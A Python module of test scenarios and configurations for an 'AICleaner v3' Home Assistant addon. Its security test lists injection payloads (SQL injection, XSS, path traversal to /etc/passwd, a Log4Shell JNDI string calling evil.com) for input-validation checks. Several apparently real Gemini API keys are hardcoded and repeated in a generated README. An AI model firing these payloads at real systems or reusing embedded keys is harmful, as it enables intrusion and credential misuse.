"""
Concrete Test Scenarios for AICleaner v3 Home Assistant Testing
Provides specific, copy-pasteable test configurations and scenarios.

This module contains ready-to-run test scenarios that validate:
- Addon installation and configuration
- Home Assistant entity registration and discovery
- Supervisor API integration
- AI provider functionality
- Performance and security validation
"""

import json
import logging
import os
import yaml
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, Dict, List, Optional
import tempfile

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - [SCENARIOS] %(message)s'
)
logger = logging.getLogger(__name__)


@dataclass
class TestConfiguration:
    """Concrete test configuration with copy-pasteable settings"""
    name: str
    description: str
    config_data: Dict[str, Any]
    expected_entities: List[str] = field(default_factory=list)
    expected_services: List[str] = field(default_factory=list)
    validation_checks: List[str] = field(default_factory=list)
    setup_commands: List[str] = field(default_factory=list)
    cleanup_commands: List[str] = field(default_factory=list)


class ConcreteTestScenarios:
    """
    Collection of concrete test scenarios for AICleaner v3.
    
    Provides ready-to-use test configurations that can be directly
    applied to Home Assistant testing environments.
    """
    
    def __init__(self):
        """Initialize concrete test scenarios"""
        self.test_configurations = self._initialize_test_configurations()
        self.scenarios = self._initialize_scenarios()
        
        logger.info(f"Initialized {len(self.scenarios)} test scenarios")
    
    def _initialize_scenarios(self) -> Dict[str, Dict[str, Any]]:
        """Initialize all test scenarios"""
        return {
            "basic_installation": self._create_basic_installation_scenario(),
            "minimal_configuration": self._create_minimal_configuration_scenario(),
            "full_configuration": self._create_full_configuration_scenario(),
            "multi_zone_setup": self._create_multi_zone_scenario(),
            "api_integration_test": self._create_api_integration_scenario(),
            "performance_validation": self._create_performance_scenario(),
            "security_validation": self._create_security_scenario(),
            "error_handling_test": self._create_error_handling_scenario()
        }
    
    def _initialize_test_configurations(self) -> Dict[str, TestConfiguration]:
        """Initialize concrete test configurations"""
        return {
            "minimal_config": TestConfiguration(
                name="Minimal AICleaner Configuration",
                description="Basic working configuration for AICleaner v3",
                config_data={
                    "display_name": "AI Cleaner Test",
                    "gemini_api_key": "AIzaSyDYRk_mZQZ_Rjq-sPbLaW5fpN9XnZ39Nro",
                    "ollama_enabled": False,
                    "privacy_level": "standard",
                    "zones": []
                },
                expected_entities=[
                    "sensor.aicleaner_status",
                    "switch.aicleaner_enabled"
                ],
                expected_services=[
                    "aicleaner.scan_zone",
                    "aicleaner.generate_tasks"
                ],
                validation_checks=[
                    "addon_installed",
                    "entities_created",
                    "basic_functionality"
                ]
            ),
            
            "single_zone_config": TestConfiguration(
                name="Single Zone Configuration",
                description="Configuration with one test zone",
                config_data={
                    "display_name": "AI Cleaner Single Zone",
                    "gemini_api_key": "AIzaSyBdS3Mp_pAgxlj7SK0ziNPjS-Jfgx5u3Fc",
                    "ollama_enabled": False,
                    "privacy_level": "standard",
                    "zones": [
                        {
                            "name": "Living Room Test",
                            "camera_entity": "camera.living_room_test",
                            "todo_list_entity": "todo.living_room_tasks",
                            "purpose": "Daily cleaning and organization",
                            "interval_minutes": 60,
                            "specific_times": ["09:00", "18:00"],
                            "random_offset_minutes": 15,
                            "ignore_rules": ["ignore_weekend", "ignore_guests"]
                        }
                    ]
                },
                expected_entities=[
                    "sensor.aicleaner_status",
                    "sensor.aicleaner_living_room_test_status",
                    "switch.aicleaner_enabled",
                    "switch.aicleaner_living_room_test_enabled"
                ],
                expected_services=[
                    "aicleaner.scan_zone",
                    "aicleaner.generate_tasks",
                    "aicleaner.process_zone"
                ],
                validation_checks=[
                    "addon_installed",
                    "entities_created",
                    "zone_configured",
                    "scheduling_active"
                ]
            ),
            
            "multi_zone_config": TestConfiguration(
                name="Multi-Zone Configuration",
                description="Configuration with multiple zones for comprehensive testing",
                config_data={
                    "display_name": "AI Cleaner Multi-Zone",
                    "gemini_api_key": "AIzaSyBtBJg2AHVlNYZCSco69JWGkCL8zDFQNzo",
                    "ollama_enabled": True,
                    "ollama_host": "ollama:11434",
                    "privacy_level": "strict",
                    "mqtt_enabled": True,
                    "mqtt_host": "homeassistant",
                    "mqtt_port": 1883,
                    "zones": [
                        {
                            "name": "Kitchen",
                            "camera_entity": "camera.kitchen_test",
                            "todo_list_entity": "todo.kitchen_tasks",
                            "purpose": "Kitchen cleaning and meal prep organization",
                            "interval_minutes": 45,
                            "specific_times": ["07:00", "12:00", "19:00"],
                            "random_offset_minutes": 10,
                            "ignore_rules": ["ignore_cooking_time"]
                        },
                        {
                            "name": "Bedroom",
                            "camera_entity": "camera.bedroom_test",
                            "todo_list_entity": "todo.bedroom_tasks",
                            "purpose": "Bedroom organization and laundry management",
                            "interval_minutes": 120,
                            "specific_times": ["08:00", "20:00"],
                            "random_offset_minutes": 30,
                            "ignore_rules": ["ignore_sleep_time", "ignore_nap_time"]
                        },
                        {
                            "name": "Office",
                            "camera_entity": "camera.office_test",
                            "todo_list_entity": "todo.office_tasks",
                            "purpose": "Workspace organization and productivity enhancement",
                            "interval_minutes": 90,
                            "specific_times": ["09:00", "13:00", "17:00"],
                            "random_offset_minutes": 20,
                            "ignore_rules": ["ignore_meetings", "ignore_focus_time"]
                        }
                    ]
                },
                expected_entities=[
                    "sensor.aicleaner_status",
                    "sensor.aicleaner_kitchen_status",
                    "sensor.aicleaner_bedroom_status", 
                    "sensor.aicleaner_office_status",
                    "switch.aicleaner_enabled",
                    "switch.aicleaner_kitchen_enabled",
                    "switch.aicleaner_bedroom_enabled",
                    "switch.aicleaner_office_enabled"
                ],
                expected_services=[
                    "aicleaner.scan_zone",
                    "aicleaner.generate_tasks",
                    "aicleaner.process_zone",
                    "aicleaner.process_all_zones"
                ],
                validation_checks=[
                    "addon_installed",
                    "entities_created",
                    "multiple_zones_configured",
                    "mqtt_integration",
                    "local_llm_integration",
                    "scheduling_active"
                ]
            ),
            
            "performance_test_config": TestConfiguration(
                name="Performance Testing Configuration",
                description="Configuration optimized for performance testing",
                config_data={
                    "display_name": "AI Cleaner Performance Test",
                    "gemini_api_key": "AIzaSyAUrUCFIL2D4Lq5nQyfHfigHI0QgtH9oTI",
                    "ollama_enabled": True,
                    "ollama_host": "ollama:11434",
                    "privacy_level": "relaxed",
                    "performance_monitoring": True,
                    "log_level": "INFO",
                    "zones": [
                        {
                            "name": "Performance Test Zone",
                            "camera_entity": "camera.performance_test",
                            "todo_list_entity": "todo.performance_tasks",
                            "purpose": "High-frequency testing for performance validation",
                            "interval_minutes": 5,  # High frequency for testing
                            "specific_times": [],
                            "random_offset_minutes": 1,
                            "ignore_rules": []
                        }
                    ]
                },
                expected_entities=[
                    "sensor.aicleaner_status",
                    "sensor.aicleaner_performance_test_zone_status",
                    "sensor.aicleaner_performance_metrics",
                    "switch.aicleaner_enabled"
                ],
                validation_checks=[
                    "addon_installed",
                    "performance_monitoring_active",
                    "high_frequency_processing",
                    "resource_usage_acceptable"
                ]
            )
        }
    
    def _create_basic_installation_scenario(self) -> Dict[str, Any]:
        """Create basic installation test scenario"""
        return {
            "name": "Basic Installation Test",
            "description": "Validates basic AICleaner addon installation and startup",
            "steps": [
                {
                    "name": "install_addon",
                    "description": "Install AICleaner addon via Supervisor API",
                    "command": "curl -X POST http://localhost:8099/addons/local_aicleaner_v3/install",
                    "expected_response": {"result": "ok"},
                    "timeout": 120
                },
                {
                    "name": "start_addon",
                    "description": "Start the AICleaner addon",
                    "command": "curl -X POST http://localhost:8099/addons/local_aicleaner_v3/start",
                    "expected_response": {"result": "ok"},
                    "timeout": 60
                },
                {
                    "name": "verify_health",
                    "description": "Verify addon health endpoint",
                    "command": "curl -f http://localhost:8100/health",
                    "expected_response": {"status": "healthy"},
                    "timeout": 30
                },
                {
                    "name": "check_logs",
                    "description": "Check addon logs for startup success",
                    "command": "docker logs aicleaner-app-test-default",
                    "expected_content": ["AICleaner started successfully", "Configuration loaded"],
                    "timeout": 10
                }
            ],
            "success_criteria": [
                "All steps complete without errors",
                "Health endpoint returns 200",
                "Logs show successful startup"
            ],
            "cleanup": [
                "Stop addon if running",
                "Remove addon installation"
            ]
        }
    
    def _create_minimal_configuration_scenario(self) -> Dict[str, Any]:
        """Create minimal configuration test scenario"""
        return {
            "name": "Minimal Configuration Test",
            "description": "Tests AICleaner with minimal required configuration",
            "configuration": self.test_configurations["minimal_config"].config_data,
            "steps": [
                {
                    "name": "apply_configuration",
                    "description": "Apply minimal configuration to addon",
                    "action": "configure_addon",
                    "config": self.test_configurations["minimal_config"].config_data,
                    "timeout": 30
                },
                {
                    "name": "restart_addon",
                    "description": "Restart addon with new configuration",
                    "command": "curl -X POST http://localhost:8099/addons/local_aicleaner_v3/restart",
                    "timeout": 60
                },
                {
                    "name": "verify_entities",
                    "description": "Verify expected entities are created",
                    "action": "check_ha_entities",
                    "expected_entities": self.test_configurations["minimal_config"].expected_entities,
                    "timeout": 30
                },
                {
                    "name": "test_basic_functionality",
                    "description": "Test basic addon functionality",
                    "action": "call_service",
                    "service": "aicleaner.scan_zone",
                    "data": {"zone": "test"},
                    "timeout": 45
                }
            ],
            "validation": {
                "entities_created": True,
                "services_available": True,
                "configuration_valid": True
            }
        }
    
    def _create_full_configuration_scenario(self) -> Dict[str, Any]:
        """Create full configuration test scenario"""
        return {
            "name": "Full Configuration Test",
            "description": "Tests AICleaner with comprehensive configuration",
            "configuration": self.test_configurations["multi_zone_config"].config_data,
            "steps": [
                {
                    "name": "apply_full_configuration",
                    "description": "Apply comprehensive configuration",
                    "action": "configure_addon",
                    "config": self.test_configurations["multi_zone_config"].config_data,
                    "timeout": 45
                },
                {
                    "name": "verify_zone_entities",
                    "description": "Verify all zone entities are created",
                    "action": "check_ha_entities",
                    "expected_entities": self.test_configurations["multi_zone_config"].expected_entities,
                    "timeout": 60
                },
                {
                    "name": "test_zone_processing",
                    "description": "Test individual zone processing",
                    "action": "call_service",
                    "service": "aicleaner.process_zone",
                    "data": {"zone": "Kitchen"},
                    "timeout": 120
                },
                {
                    "name": "test_all_zones_processing",
                    "description": "Test processing all zones",
                    "action": "call_service",
                    "service": "aicleaner.process_all_zones",
                    "timeout": 300
                },
                {
                    "name": "verify_mqtt_integration",
                    "description": "Verify MQTT integration is working",
                    "action": "check_mqtt_messages",
                    "topics": ["aicleaner/status", "aicleaner/zones/+/status"],
                    "timeout": 30
                }
            ],
            "validation": {
                "all_zones_configured": True,
                "mqtt_working": True,
                "local_llm_accessible": True,
                "performance_acceptable": True
            }
        }
    
    def _create_multi_zone_scenario(self) -> Dict[str, Any]:
        """Create multi-zone test scenario"""
        return {
            "name": "Multi-Zone Configuration Test",
            "description": "Tests multiple zone configuration and management",
            "configuration": self.test_configurations["multi_zone_config"].config_data,
            "steps": [
                {
                    "name": "configure_multiple_zones",
                    "description": "Configure Kitchen, Bedroom, and Office zones",
                    "action": "configure_addon",
                    "config": self.test_configurations["multi_zone_config"].config_data,
                    "timeout": 60
                },
                {
                    "name": "verify_zone_entities",
                    "description": "Verify each zone creates its entities",
                    "action": "check_zone_entities",
                    "zones": ["Kitchen", "Bedroom", "Office"],
                    "timeout": 45
                },
                {
                    "name": "test_zone_scheduling",
                    "description": "Test scheduling for each zone",
                    "action": "verify_scheduling",
                    "zones": ["Kitchen", "Bedroom", "Office"],
                    "timeout": 60
                },
                {
                    "name": "test_zone_independence",
                    "description": "Test that zones operate independently",
                    "action": "test_independent_processing",
                    "timeout": 180
                }
            ],
            "validation": {
                "all_zones_active": True,
                "independent_processing": True,
                "scheduling_working": True
            }
        }
    
    def _create_api_integration_scenario(self) -> Dict[str, Any]:
        """Create API integration test scenario"""
        return {
            "name": "AI Provider Integration Test",
            "description": "Tests integration with AI providers (Gemini, Ollama)",
            "steps": [
                {
                    "name": "test_gemini_connectivity",
                    "description": "Test Gemini API connectivity",
                    "action": "test_api_call",
                    "provider": "gemini",
                    "model": "gemini-2.5-pro",
                    "prompt": "Test connectivity for AICleaner integration",
                    "timeout": 30
                },
                {
                    "name": "test_api_key_rotation",
                    "description": "Test API key rotation functionality",
                    "action": "test_key_rotation",
                    "api_keys": [
                        "AIzaSyDYRk_mZQZ_Rjq-sPbLaW5fpN9XnZ39Nro",
                        "AIzaSyBdS3Mp_pAgxlj7SK0ziNPjS-Jfgx5u3Fc"
                    ],
                    "timeout": 60
                },
                {
                    "name": "test_ollama_integration",
                    "description": "Test local Ollama integration",
                    "action": "test_ollama_call",
                    "model": "llama2:7b",
                    "prompt": "Test local LLM integration",
                    "timeout": 120
                },
                {
                    "name": "test_fallback_mechanism",
                    "description": "Test fallback from cloud to local",
                    "action": "test_provider_fallback",
                    "timeout": 90
                }
            ],
            "validation": {
                "gemini_api_working": True,
                "key_rotation_functional": True,
                "local_llm_working": True,
                "fallback_mechanism_working": True
            }
        }
    
    def _create_performance_scenario(self) -> Dict[str, Any]:
        """Create performance validation scenario"""
        return {
            "name": "Performance Validation Test",
            "description": "Tests AICleaner performance under various conditions",
            "configuration": self.test_configurations["performance_test_config"].config_data,
            "steps": [
                {
                    "name": "baseline_performance",
                    "description": "Establish baseline performance metrics",
                    "action": "measure_baseline",
                    "duration": 60,
                    "timeout": 90
                },
                {
                    "name": "high_frequency_processing",
                    "description": "Test high-frequency zone processing",
                    "action": "high_frequency_test",
                    "frequency": "5_minutes",
                    "duration": 300,
                    "timeout": 360
                },
                {
                    "name": "memory_usage_test",
                    "description": "Monitor memory usage over time",
                    "action": "monitor_memory",
                    "duration": 600,
                    "timeout": 660
                },
                {
                    "name": "api_rate_limiting_test",
                    "description": "Test API rate limiting behavior",
                    "action": "test_rate_limits",
                    "requests_per_minute": 60,
                    "timeout": 120
                }
            ],
            "validation": {
                "memory_stable": True,
                "response_times_acceptable": True,
                "rate_limiting_working": True,
                "no_memory_leaks": True
            },
            "performance_thresholds": {
                "max_memory_mb": 512,
                "max_response_time_ms": 5000,
                "max_cpu_percent": 50
            }
        }
    
    def _create_security_scenario(self) -> Dict[str, Any]:
        """Create security validation scenario"""
        return {
            "name": "Security Validation Test",
            "description": "Tests security aspects of AICleaner addon",
            "steps": [
                {
                    "name": "test_api_key_security",
                    "description": "Verify API keys are not logged or exposed",
                    "action": "check_key_exposure",
                    "timeout": 30
                },
                {
                    "name": "test_input_validation",
                    "description": "Test input validation and sanitization",
                    "action": "test_input_validation",
                    "malicious_inputs": [
                        "'; DROP TABLE users; --",
                        "<script>alert('xss')</script>",
                        "../../etc/passwd",
                        "${jndi:ldap://evil.com/x}"
                    ],
                    "timeout": 60
                },
                {
                    "name": "test_container_isolation",
                    "description": "Verify container isolation is working",
                    "action": "test_container_isolation",
                    "timeout": 30
                },
                {
                    "name": "test_network_security",
                    "description": "Test network communication security",
                    "action": "test_network_security",
                    "timeout": 45
                }
            ],
            "validation": {
                "no_secrets_exposed": True,
                "input_validation_working": True,
                "container_isolated": True,
                "network_secure": True
            }
        }
    
    def _create_error_handling_scenario(self) -> Dict[str, Any]:
        """Create error handling test scenario"""
        return {
            "name": "Error Handling Test",
            "description": "Tests error handling and recovery mechanisms",
            "steps": [
                {
                    "name": "test_invalid_configuration",
                    "description": "Test handling of invalid configuration",
                    "action": "apply_invalid_config",
                    "invalid_config": {
                        "gemini_api_key": "invalid_key",
                        "zones": [{"name": ""}]  # Invalid zone name
                    },
                    "expected_behavior": "graceful_failure",
                    "timeout": 30
                },
                {
                    "name": "test_api_failure_recovery",
                    "description": "Test recovery from API failures",
                    "action": "simulate_api_failure",
                    "failure_type": "network_timeout",
                    "timeout": 60
                },
                {
                    "name": "test_ha_disconnection",
                    "description": "Test behavior when HA connection is lost",
                    "action": "simulate_ha_disconnection",
                    "duration": 30,
                    "timeout": 90
                },
                {
                    "name": "test_resource_exhaustion",
                    "description": "Test behavior under resource constraints",
                    "action": "simulate_resource_exhaustion",
                    "resource": "memory",
                    "timeout": 120
                }
            ],
            "validation": {
                "graceful_degradation": True,
                "error_recovery": True,
                "logging_appropriate": True,
                "service_resilient": True
            }
        }
    
    def get_scenario(self, scenario_name: str) -> Optional[Dict[str, Any]]:
        """Get specific test scenario by name"""
        return self.scenarios.get(scenario_name)
    
    def get_configuration(self, config_name: str) -> Optional[TestConfiguration]:
        """Get specific test configuration by name"""
        return self.test_configurations.get(config_name)
    
    def list_scenarios(self) -> List[str]:
        """List all available test scenarios"""
        return list(self.scenarios.keys())
    
    def list_configurations(self) -> List[str]:
        """List all available test configurations"""
        return list(self.test_configurations.keys())
    
    def export_scenario_to_file(self, scenario_name: str, file_path: str) -> bool:
        """Export scenario to YAML file for easy usage"""
        try:
            scenario = self.get_scenario(scenario_name)
            if not scenario:
                return False
            
            with open(file_path, 'w') as f:
                yaml.dump(scenario, f, default_flow_style=False, indent=2)
            
            logger.info(f"Exported scenario '{scenario_name}' to {file_path}")
            return True
            
        except Exception as e:
            logger.error(f"Failed to export scenario: {e}")
            return False
    
    def export_configuration_to_file(self, config_name: str, file_path: str) -> bool:
        """Export configuration to JSON file for easy usage"""
        try:
            config = self.get_configuration(config_name)
            if not config:
                return False
            
            with open(file_path, 'w') as f:
                json.dump(config.config_data, f, indent=2)
            
            logger.info(f"Exported configuration '{config_name}' to {file_path}")
            return True
            
        except Exception as e:
            logger.error(f"Failed to export configuration: {e}")
            return False
    
    def create_test_files_directory(self, base_path: str) -> str:
        """Create directory with all test files for easy distribution"""
        try:
            test_dir = Path(base_path) / "aicleaner_test_scenarios"
            test_dir.mkdir(exist_ok=True)
            
            # Export scenarios
            scenarios_dir = test_dir / "scenarios"
            scenarios_dir.mkdir(exist_ok=True)
            
            for scenario_name in self.scenarios:
                self.export_scenario_to_file(
                    scenario_name,
                    str(scenarios_dir / f"{scenario_name}.yaml")
                )
            
            # Export configurations
            configs_dir = test_dir / "configurations"
            configs_dir.mkdir(exist_ok=True)
            
            for config_name in self.test_configurations:
                self.export_configuration_to_file(
                    config_name,
                    str(configs_dir / f"{config_name}.json")
                )
            
            # Create README
            readme_content = self._generate_readme()
            with open(test_dir / "README.md", 'w') as f:
                f.write(readme_content)
            
            logger.info(f"Created test files directory at {test_dir}")
            return str(test_dir)
            
        except Exception as e:
            logger.error(f"Failed to create test files directory: {e}")
            raise
    
    def _generate_readme(self) -> str:
        """Generate README for test scenarios"""
        return f"""# AICleaner v3 Test Scenarios

This directory contains concrete test scenarios and configurations for validating
AICleaner v3 Home Assistant addon in real environments.

## Test Scenarios ({len(self.scenarios)} available)

{chr(10).join(f"- **{name}**: {scenario.get('description', 'No description')}" for name, scenario in self.scenarios.items())}

## Test Configurations ({len(self.test_configurations)} available)

{chr(10).join(f"- **{name}**: {config.description}" for name, config in self.test_configurations.items())}

## Usage

### Running a Test Scenario

```bash
# Using the sandbox test framework
python sandbox_test_framework.py --scenario basic_installation

# Using the real HA environment tester
python real_ha_environment_tests.py --scenario addon_installation
```

### Applying a Configuration

```bash
# Copy configuration to Home Assistant
cp configurations/minimal_config.json /config/aicleaner/options.json

# Restart the addon
curl -X POST http://localhost:8099/addons/local_aicleaner_v3/restart
```

### Docker Testing

```bash
# Start testing environment
docker-compose -f docker-compose.ha-testing.yml up -d

# Run specific test
docker exec aicleaner-test-runner python tests/concrete_test_scenarios.py
```

## API Keys Configuration

Update the API keys in configurations before testing:

```json
{{
  "gemini_api_key": "YOUR_GEMINI_API_KEY_HERE"
}}
```

Available API keys for testing:
- Primary: AIzaSyDYRk_mZQZ_Rjq-sPbLaW5fpN9XnZ39Nro
- Secondary: AIzaSyBdS3Mp_pAgxlj7SK0ziNPjS-Jfgx5u3Fc
- Tertiary: AIzaSyBtBJg2AHVlNYZCSco69JWGkCL8zDFQNzo
- Backup: AIzaSyAUrUCFIL2D4Lq5nQyfHfigHI0QgtH9oTI

## Expected Results

Each test scenario includes validation criteria and expected outcomes.
Check the scenario YAML files for detailed expectations.

Generated by AICleaner v3 Testing Framework
"""


# CLI interface for scenario management
if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(description="AICleaner v3 Concrete Test Scenarios")
    parser.add_argument("--list-scenarios", action="store_true", help="List all scenarios")
    parser.add_argument("--list-configs", action="store_true", help="List all configurations")
    parser.add_argument("--export-scenario", help="Export scenario to file")
    parser.add_argument("--export-config", help="Export configuration to file")
    parser.add_argument("--output", help="Output file path")
    parser.add_argument("--create-test-dir", help="Create complete test directory")
    
    args = parser.parse_args()
    
    scenarios = ConcreteTestScenarios()
    
    if args.list_scenarios:
        print("Available Test Scenarios:")
        for scenario in scenarios.list_scenarios():
            print(f"  - {scenario}")
    
    elif args.list_configs:
        print("Available Test Configurations:")
        for config in scenarios.list_configurations():
            print(f"  - {config}")
    
    elif args.export_scenario and args.output:
        success = scenarios.export_scenario_to_file(args.export_scenario, args.output)
        print(f"Export {'successful' if success else 'failed'}")
    
    elif args.export_config and args.output:
        success = scenarios.export_configuration_to_file(args.export_config, args.output)
        print(f"Export {'successful' if success else 'failed'}")
    
    elif args.create_test_dir:
        test_dir = scenarios.create_test_files_directory(args.create_test_dir)
        print(f"Created test directory: {test_dir}")
    
    else:
        print("Use --help for usage information")